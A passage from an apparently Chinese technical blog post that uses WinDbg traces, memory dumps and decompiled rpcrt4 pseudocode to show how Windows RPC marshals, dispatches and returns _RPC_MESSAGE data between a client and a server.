class="params">...</span>.</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在经过NdrpClientMarshal函数序列化之后，调用NdrpSendReceive函数发送NDR数据<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kn</div><div class="line"> # ChildEBP RetAddr  </div><div class="line"><span class="number">00</span> <span class="number">0040</span>f<span class="number">334</span> <span class="number">77090</span>da<span class="number">2</span> RPCRT<span class="number">4</span><span class="title">!OSF_CCALL</span>::SendReceiveHelper</div><div class="line"><span class="number">01</span> <span class="number">0040</span>f<span class="number">35</span><span class="keyword">c</span> <span class="number">7704</span>b<span class="number">313</span> RPCRT<span class="number">4</span><span class="title">!OSF_CLIENT_MESSAGE_SENDER</span>::SendReceive+<span class="number">0x35</span></div><div class="line"><span class="number">02</span> <span class="number">0040</span>f<span class="number">36</span><span class="keyword">c</span> <span class="number">770373</span>f<span class="number">9</span> RPCRT<span class="number">4</span><span class="title">!OSF_CCALL</span>::SendReceive+<span class="number">0x13</span></div><div class="line"><span class="number">03</span> <span class="number">0040</span>f<span class="number">37</span><span class="keyword">c</span> <span class="number">770380</span>bb RPCRT<span class="number">4</span><span class="title">!I_RpcSendReceive</span>+<span class="number">0x28</span></div><div class="line"><span class="number">04</span> <span class="number">0040</span>f<span class="number">390</span> <span class="number">7703808</span>a RPCRT<span class="number">4</span><span class="title">!NdrSendReceive</span>+<span class="number">0x31</span></div><div class="line"><span class="number">05</span> <span class="number">0040</span>f<span class="number">39</span><span class="keyword">c</span> <span class="number">770</span>d<span class="number">0149</span> RPCRT<span class="number">4</span><span class="title">!NdrpSendReceive</span>+<span class="number">0x9</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在OSF_CCALL::SendReceiveHelper+0x48处，将RpcMsg-&gt;Buffer赋值到OSF_CCALL类偏移0x100处，接着调用OSF_CCALL::FastSendReceive函数继续发送数据。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*(this + <span class="number">64</span>) = <span class="built_in">a2</span>-&gt;<span class="keyword">Buffer; </span>                 // 会将参数列表复制到<span class="keyword">buffer中</span></div><div class="line"><span class="keyword">v6 </span>= OSF_CCALL::FastSendReceive(this, <span class="built_in">a2</span>, <span class="built_in">a3</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><h2 id="0x2-2-服务端接收数据"><a href="#0x2-2-服务端接收数据" class="headerlink" title="0x2.2 服务端接收数据"></a>0x2.2 服务端接收数据</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从相关介绍中，我了解到NdrServerCall2作为服务端入口函数存在的，但是服务端并不直接调用NdrServerCall2接收和传送客户端的数据。有关服务端在进行PRC调用的时候，接收，调用，以及返回数据的函数堆栈如下：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">003</span>&gt; kn</div><div class="line"> # ChildEBP RetAddr  </div><div class="line"><span class="number">00</span> <span class="number">00</span>cff<span class="number">3</span><span class="keyword">cc</span> <span class="number">77055</span>a<span class="number">57</span> Server<span class="title">!Add</span></div><div class="line"><span class="number">01</span> <span class="number">00</span>cff<span class="number">3</span>ec <span class="number">770</span>d<span class="number">05</span>f<span class="number">1</span> RPCRT<span class="number">4</span><span class="title">!Invoke</span>+<span class="number">0x2a</span></div><div class="line"><span class="number">02</span> <span class="number">00</span>cff<span class="number">7</span>f<span class="number">0</span> <span class="number">770</span>d<span class="number">104</span>e RPCRT<span class="number">4</span><span class="title">!NdrStubCall2</span>+<span class="number">0x2ea</span></div><div class="line"><span class="number">03</span> <span class="number">00</span>cff<span class="number">80</span><span class="keyword">c</span> <span class="number">77055</span>fe<span class="number">3</span> RPCRT<span class="number">4</span><span class="title">!NdrServerCall2</span>+<span class="number">0x19</span></div><div class="line"><span class="number">04</span> <span class="number">00</span>cff<span class="number">844</span> <span class="number">77056483</span> RPCRT<span class="number">4</span><span class="title">!DispatchToStubInCNoAvrf</span>+<span class="number">0x46</span></div><div class="line"><span class="number">05</span> <span class="number">00</span>cff<span class="number">89</span><span class="keyword">c</span> <span class="number">7705635</span>d RPCRT<span class="number">4</span><span class="title">!RPC_INTERFACE</span>::DispatchToStubWorker+<span class="number">0x158</span></div><div class="line"><span class="number">06</span> <span class="number">00</span>cff<span class="number">8</span><span class="keyword">c</span><span class="number">0</span> <span class="number">77097</span>ddd RPCRT<span class="number">4</span><span class="title">!RPC_INTERFACE</span>::DispatchToStub+<span class="number">0x90</span></div><div class="line"><span class="number">07</span> <span class="number">00</span>cff<span class="number">94</span><span class="keyword">c</span> <span class="number">7709812</span><span class="keyword">c</span> RPCRT<span class="number">4</span><span class="title">!OSF_SCALL</span>::DispatchHelper+<span class="number">0x23f</span></div><div class="line"><span class="number">08</span> <span class="number">00</span>cff<span class="number">960</span> <span class="number">77098371</span> RPCRT<span class="number">4</span><span class="title">!OSF_SCALL</span>::DispatchRPCCall+<span class="number">0xf5</span></div><div class="line"><span class="number">09</span> <span class="number">00</span>cff<span class="number">98</span><span class="keyword">c</span> <span class="number">77098910</span> RPCRT<span class="number">4</span><span class="title">!OSF_SCALL</span>::ProcessReceivedPDU+<span class="number">0x223</span></div><div class="line"><span class="number">0</span>a <span class="number">00</span>cff<span class="number">9</span>ac <span class="number">77098</span>b<span class="number">0</span><span class="keyword">c</span> RPCRT<span class="number">4</span><span class="title">!OSF_SCALL</span>::BeginRpcCall+<span class="number">0x123</span></div><div class="line"><span class="number">0</span>b <span class="number">00</span>cffa<span class="number">08</span> <span class="number">770</span>a<span class="number">749</span>f RPCRT<span class="number">4</span><span class="title">!OSF_SCONNECTION</span>::ProcessReceiveComplete+<span class="number">0x1e1</span></div><div class="line"><span class="number">0</span><span class="keyword">c</span> <span class="number">00</span>cffa<span class="number">1</span><span class="keyword">c</span> <span class="number">770</span>bbfbf RPCRT<span class="number">4</span><span class="title">!ProcessConnectionServerReceivedEvent</span>+<span class="number">0x1c</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在OSF_SCALL::DispatchHelper函数中，会调用RPC_INTERFACE::DispatchToStub函数，其中第二个参数应该为_RPC_MESSAGE结构体(堆栈中应为第一个，因为又在this指针)<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">v13 = RPC_INTERFACE::DispatchToStub(v2, (this + <span class="number">196</span>), <span class="number">0</span>, v16, &amp;v18);<span class="comment">// &lt;-----this+196为_RPC_MESSAGE</span></div><div class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dc esp</div><div class="line"><span class="number">00</span>d5facc  <span class="number">003</span>b192c <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00</span>d5faec  ,.;.............</div><div class="line"><span class="number">00</span>d5fadc  <span class="number">003</span>b1670 <span class="number">003</span>b1868 <span class="number">00000000</span> <span class="number">003</span>acca8  p.;.h.;.......:.</div><div class="line"><span class="number">00</span>d5faec  <span class="number">003</span>b17f0 <span class="number">00000000</span> <span class="number">00000400</span> <span class="number">00</span>d5fb04  ..;............</div><div class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _RPC_MESSAGE <span class="number">003</span>b192c</div><div class="line">Server!_RPC_MESSAGE</div><div class="line">   +<span class="number">0x000</span> Handle           : <span class="number">0x003b1868</span> Void</div><div class="line">   +<span class="number">0x004</span> DataRepresentation : <span class="number">0x10</span></div><div class="line">   +<span class="number">0x008</span> Buffer           : <span class="number">0x003b1ad0</span> Void</div><div class="line">   +<span class="number">0x00c</span> BufferLength     : <span class="number">4</span></div><div class="line">   +<span class="number">0x010</span> ProcNum          : <span class="number">0</span></div><div class="line">   .....</div><div class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dc <span class="number">003</span>b1ad0</div><div class="line"><span class="number">003</span>b1ad0  <span class="number">00000040</span> <span class="number">00010000</span> <span class="number">551</span>d88b0 <span class="number">4283</span>b831  @..........U1..B</div><div class="line"><span class="number">00</span>d5fadc  <span class="number">003</span>b1670 <span class="number">003</span>b1868 <span class="number">00000000</span> <span class="number">003</span>acca8  p.;.h.;.......:.</div><div class="line"><span class="number">00</span>d5faec  <span class="number">003</span>b17f0 <span class="number">00000000</span> <span class="number">00000400</span> <span class="number">00</span>d5fb04  ..;.............</div><div class="line">...</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，调用DispatchToStubInCNoAvrf函数，其目的是将_RPC_MESSAGE传入NdrServerCall2。然后调用NdrStubCall2函数。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">RPCRT4!DispatchToStubInCNoAvrf:</div><div class="line">77055fcc 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span></div><div class="line">77055fce 68f85f0577      <span class="keyword">push</span>    offset RPCRT4!_imp_load__FreeAddrInfoW+<span class="number">0x1a8</span> (77055ff8)</div><div class="line">77055fd3 e83506feff      <span class="keyword">call</span>    RPCRT4!_SEH_prolog4 (<span class="number">7703660d</span>)</div><div class="line">77055fd8 33f6            <span class="keyword">xor</span>     <span class="built_in">esi</span>,<span class="built_in">esi</span></div><div class="line">77055fda 8975fc          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="built_in">esi</span></div><div class="line">77055fdd ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]</div><div class="line">77055fe0 ff5508          <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]    <span class="built_in">ss</span>:002b:00d5fa50=&#123;Server!ILT+<span class="number">4690</span>(_NdrServerCall2 (<span class="number">01310257</span>)&#125;</div><div class="line">77055fe3 c745fcfeffffff  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">0FFFFFFFEh</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实，NdrStubCall2函数主要作用是根据_RPC_MESSAGE提供的pRpcMsg-&gt;ProcNum信息，获取服务端内对应的函数，根据pRpcMsg-&gt;Buffer获取参数，继而调用Invoke函数。以下是部分代码。另外，Marshal NDR数据的时候，也是和之前客户端相反的，客户端先Marshal成NDR数据，然后发送，等接收后在UnMarshal。而服务端是先UnMarshal，然后在执行，最后Marshal。<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">DispatchTable_ = pRpcMsg_[8];</div><div class="line">if ( !DispatchTable_ )</div><div class="line">DispatchTable_ = DispatchTable;</div><div class="line">pFunc = DispatchTable_[ProcNum];</div><div class="line">ArgNum = StackSize &gt;&gt; 2;</div><div class="line">v26 = StackSize &gt;&gt; 2;</div><div class="line">if ( StackSize &gt;&gt; 2 &amp;&amp; (OptFlags-&gt;Unused &amp; 4) != 0 &amp;&amp; (v42 &amp; 8) == 0 )</div><div class="line">v26 = --ArgNum;</div><div class="line">pArgBuffer_ = pArgBuffer;</div><div class="line">returnValue = Invoke(pFunc, pArgBuffer, ArgNum);// &lt;------</div><div class="line">if ( (OptFlags-&gt;Unused &amp; 4) == 0 )</div><div class="line">goto LABEL_26;</div><div class="line">if ( (v42 &amp; 8) == 0 )</div><div class="line">*&amp;pArgBuffer_[4 * ArgNum] = returnValue;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Invoke函数，显然可以看到将两个参数传入需要被调用函数中。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dc esp</div><div class="line"><span class="number">00</span>d5f5dc  <span class="number">003</span>b1188 <span class="number">00000040</span> <span class="number">00000202</span> <span class="number">00000002</span>  ..;.@...........</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然,当调用完NdrpServerMarshal之后，便在pRpcMsg-&gt;Buffer中保存了结果<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">0:002&gt; dt _MIDL_STUB_MESSAGE  00a2f1f0</div><div class="line">Server!_MIDL_STUB_MESSAGE</div><div class="line">   +0x000 RpcMsg           : 0x003b192c _RPC_MESSAGE</div><div class="line">   +0x004 Buffer           : 0x003b0f48  <span class="string">""</span></div><div class="line">   +0x008 BufferStart      : 0x003b1fd0  <span class="string">"???"</span></div><div class="line">   +0x00c BufferEnd        : 0x003b1fd8  <span class="string">".???"</span></div><div class="line">0:002&gt; dt _RPC_MESSAGE 003b192c </div><div class="line">Server!_RPC_MESSAGE</div><div class="line">   +0x000 Handle           : 0x003b1868 Void</div><div class="line">   +0x004 DataRepresentation : 0x10</div><div class="line">   +0x008 Buffer           : 0x003b0f40 Void</div><div class="line">   +0x00c BufferLength     : 0x24</div><div class="line">   +0x010 ProcNum          : 1</div><div class="line">   +0x014 TransferSyntax   : 0x003accd4 _RPC_SYNTAX_IDENTIFIER</div><div class="line">   +0x018 RpcInterfaceInformation : 0x003accbc Void</div><div class="line">   +0x01c ReservedForRuntime : 0x003b1958 Void</div><div class="line">   +0x020 ManagerEpv       : (<span class="literal">null</span>) </div><div class="line">   +0x024 ImportContext    : 0xbaadf00d Void</div><div class="line">   +0x028 RpcFlags         : 0</div><div class="line">0:002&gt; dc 003b0f40</div><div class="line">003b0f40  00000004 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">003b0f50  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">003b0f60  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div></pre></td></tr></table></figure></p><h2 id="0x2-3-服务端发送数据"><a href="#0x2-3-服务端发送数据" class="headerlink" title="0x2.3 服务端发送数据"></a>0x2.3 服务端发送数据</h2><p>在OSF_SCALL::DispatchHelper函数中，在执行完RPC_INTERFACE::DispatchToStub函数(执行Invoke函数)之后，便会调用OSF_SCALL::Send函数，第二个参数(this + 196)是不是很熟悉，保存的就是_RPC_MESSAGE结构体。看来在传输过程中，RPC主要传输的是_RPC_MESSAGE。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">OSF_SCALL::Send(this, (this + <span class="number">196</span>));      <span class="comment">// &lt;------发送</span></div><div class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc esp</div><div class="line"><span class="number">00</span>a2f6b4  <span class="number">003</span>b192c <span class="number">003</span>b1670 <span class="number">003</span>b1868 <span class="number">00000000</span>  ,.;.p.;.h.;.....</div><div class="line"><span class="number">00</span>a2f6c4  <span class="number">003</span>acca8 <span class="number">003</span>b17f0 <span class="number">00000000</span> <span class="number">00000000</span>  ..:...;.........</div><div class="line">....</div><div class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _RPC_MESSAGE <span class="number">003</span>b192c </div><div class="line">Server!_RPC_MESSAGE</div><div class="line">   +<span class="number">0x000</span> Handle           : <span class="number">0x003b1868</span> Void</div><div class="line">   +<span class="number">0x004</span> DataRepresentation : <span class="number">0x10</span></div><div class="line">   +<span class="number">0x008</span> Buffer           : <span class="number">0x003b0f40</span> Void</div><div class="line">   +<span class="number">0x00c</span> BufferLength     : <span class="number">8</span></div><div class="line">   +<span class="number">0x010</span> ProcNum          : <span class="number">1</span></div><div class="line">   +<span class="number">0x014</span> TransferSyntax   : <span class="number">0x003accd4</span> _RPC_SYNTAX_IDENTIFIER</div><div class="line">   +<span class="number">0x018</span> RpcInterfaceInformation : <span class="number">0x003accbc</span> Void</div><div class="line">   +<span class="number">0x01c</span> ReservedForRuntime : <span class="number">0x003b1958</span> Void</div><div class="line">   +<span class="number">0x020</span> ManagerEpv       : (null) </div><div class="line">   +<span class="number">0x024</span> ImportContext    : <span class="number">0xbaadf00d</span> Void</div><div class="line">   +<span class="number">0x028</span> RpcFlags         : <span class="number">0</span></div><div class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">003</span>b0f40</div><div class="line"><span class="number">003</span>b0f40  <span class="number">00000004</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">003</span>b0f50  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">003</span>b0f60  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">003</span>b0f70  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div></pre></td></tr></table></figure></p><h2 id="0x2-4-客户端接收数据"><a href="#0x2-4-客户端接收数据" class="headerlink" title="0x2.4 客户端接收数据"></a>0x2.4 客户端接收数据</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在OSF_CCALL::SendNextFragment中，调用OSF_CCONNECTION::SendFragment函数，其中，这里的a4，对应的其实是pContext，<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">v6 = OSF_CCONNECTION::SendFragment(</div><div class="line">     *(this + <span class="number">40</span>),</div><div class="line">     v14,</div><div class="line">     this,</div><div class="line">     v23,</div><div class="line">     v24,</div><div class="line">     *(this + <span class="number">54</span>),</div><div class="line">     v21,</div><div class="line">     *(this + <span class="number">53</span>),</div><div class="line">     *(this + <span class="number">57</span>),</div><div class="line">     *(*(this + <span class="number">40</span>) + <span class="number">88</span>) &amp; <span class="number">0x40</span>,</div><div class="line">     v22,</div><div class="line">     v25,</div><div class="line">     a4,</div><div class="line">     a5);</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc esi</div><div class="line"><span class="number">0040</span>f308  <span class="number">004</span>dc550 <span class="number">00000000</span> <span class="number">6</span>d4f9985 <span class="number">0040</span>f334  P.M.......Om4.@.</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">004</span>dc550 </div><div class="line"><span class="number">004</span>dc550  <span class="number">03020005</span> <span class="number">00000010</span> <span class="number">00000060</span> <span class="number">00000002</span>  ........`.......</div><div class="line"><span class="number">004</span>dc560  <span class="number">00000048</span> <span class="number">00000000</span> <span class="number">00000040</span> <span class="number">53435052</span>  H.......@...RPCS</div><div class="line"><span class="number">004</span>dc570  <span class="number">65767265</span> <span class="number">00000072</span> <span class="number">00000000</span> <span class="number">00000000</span>  erver...........</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">004</span>dc550+<span class="number">18</span></div><div class="line"><span class="number">004</span>dc568  <span class="number">00000040</span> <span class="number">53435052</span> <span class="number">65767265</span> <span class="number">00000072</span>  @...RPCServer...</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在OSF_CCALL::FastSendReceive函数中，接着程序会调用<code>OSF_CCALL::ActuallyProcessPDU</code>函数，其中Src保存的是pContxt，跟准确的表达也就是[InOut]参数，在调用之前，可以看到BufferLength为4，即传入了一个参数的大小，当调用完成之后，BufferLength变为了48，且buffer中也有了返回的结果。<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">v6 = OSF_CCALL<span class="type">::ActuallyProcessPDU</span>(this, Src, v46, a2, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _RPC_MESSAGE <span class="number">0040</span>f3b4</div><div class="line">Client!_RPC_MESSAGE</div><div class="line">   +<span class="number">0x000</span> <span class="keyword">Handle</span>           : <span class="number">0x004dbb78</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x004</span> DataRepresentation : <span class="number">0x22c</span></div><div class="line">   +<span class="number">0x008</span> Buffer           : <span class="number">0x004dc2d0</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x00c</span> BufferLength     : <span class="number">4</span></div><div class="line">   +<span class="number">0x010</span> ProcNum          : <span class="number">0</span></div><div class="line">   +<span class="number">0x014</span> TransferSyntax   : <span class="number">0x00000004</span> _RPC_SYNTAX_IDENTIFIER</div><div class="line">   +<span class="number">0x018</span> RpcInterfaceInformation : <span class="number">0x00110d28</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x01c</span> ReservedForRuntime : <span class="number">0x77ac59bc</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x020</span> ManagerEpv       : <span class="number">0x00000008</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x024</span> ImportContext    : <span class="number">0x77a39a3a</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x028</span> RpcFlags         : <span class="number">0</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">004</span>dc2d0 </div><div class="line"><span class="number">004</span>dc2d0  <span class="number">00000040</span> <span class="number">00010000</span> <span class="number">551</span>d88b0 <span class="number">4283</span>b831  @<span class="params">...</span><span class="params">...</span><span class="params">...</span>.U1..B</div><div class="line"><span class="number">004</span>dc2e0  <span class="number">6527</span>cda1 <span class="number">289</span>fe459 <span class="number">00000001</span> <span class="number">8</span>a885d04  ..<span class="string">'eY..(.....]..</span></div><div class="line"><span class="string">004dc2f0  11c91ceb 0008e89f 6048102b 00000002  ........+.H`....</span></div><div class="line"><span class="string">004dc300  00010001 551d88b0 4283b831 6527cda1  .......U1..B..'</span>e</div><div class="line"><span class="comment">//调用完成之后</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _RPC_MESSAGE <span class="number">0040</span>f3b4</div><div class="line">Client!_RPC_MESSAGE</div><div class="line">   +<span class="number">0x000</span> <span class="keyword">Handle</span>           : <span class="number">0x004dbb78</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x004</span> DataRepresentation : <span class="number">0x10</span></div><div class="line">   +<span class="number">0x008</span> Buffer           : <span class="number">0x004dc568</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x00c</span> BufferLength     : <span class="number">0x48</span></div><div class="line">   +<span class="number">0x010</span> ProcNum          : <span class="number">0</span></div><div class="line">   +<span class="number">0x014</span> TransferSyntax   : <span class="number">0x00000004</span> _RPC_SYNTAX_IDENTIFIER</div><div class="line">   +<span class="number">0x018</span> RpcInterfaceInformation : <span class="number">0x00110d28</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x01c</span> ReservedForRuntime : <span class="number">0x77ac59bc</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x020</span> ManagerEpv       : <span class="number">0x00000008</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x024</span> ImportContext    : <span class="number">0x77a39a3a</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x028</span> RpcFlags         : <span class="number">0x1000</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">004</span>dc568</div><div class="line"><span class="number">004</span>dc568  <span class="number">00000040</span> <span class="number">53435052</span> <span class="number">65767265</span> <span class="number">00000072</span>  @<span class="params">...</span>RPCServer<span class="params">...</span></div><div class="line"><span class="number">004</span>dc578  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc588  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc598  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc5a8  <span class="number">00000000</span> <span class="number">00000000</span> baadf00d baadf00d  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc5b8  baadf00d baadf00d baadf00d baadf00d  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc5c8  baadf00d baadf00d baadf00d baadf00d  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc5d8  baadf00d baadf00d baadf00d baadf00d  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过NdrpSendReceive函数之后，_RPC_MESSAGE.buffer(同_MIDL_STUB_MESSAGE.Buffer)却存储参数堆栈<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _MIDL_STUB_MESSAGE <span class="number">0040</span>f3e0</div><div class="line">Client!_MIDL_STUB_MESSAGE</div><div class="line">   +<span class="number">0x000</span> RpcMsg           : <span class="number">0x0040f3b4</span> _RPC_MESSAGE</div><div class="line">   +<span class="number">0x004</span> Buffer           : <span class="number">0x004dc568</span>  <span class="string">"@"</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">004</span>dc568 </div><div class="line"><span class="number">004</span>dc568  <span class="number">00000040</span> <span class="number">53435052</span> <span class="number">65767265</span> <span class="number">00000072</span>  